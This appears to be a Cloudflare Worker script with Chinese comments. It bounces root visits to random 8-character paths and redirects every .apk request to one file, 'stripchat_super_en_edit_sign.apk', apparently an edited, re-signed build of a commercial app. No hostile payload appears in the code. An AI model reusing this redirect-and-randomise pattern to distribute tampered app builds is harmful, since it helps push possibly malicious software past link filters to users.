addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // 如果是根路径访问
  if (url.pathname === '/') {
    // 生成随机字符串
    const randomString = generateRandomString(8)
    return Response.redirect(`${url.origin}/${randomString}`, 302)
  }
  
  // 如果访问的是apk文件
  if (url.pathname.endsWith('.apk')) {
    return Response.redirect('/stripchat_super_en_edit_sign.apk', 302)
  }

  // 返回原始HTML内容
  return fetch(request)
}

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return result
}
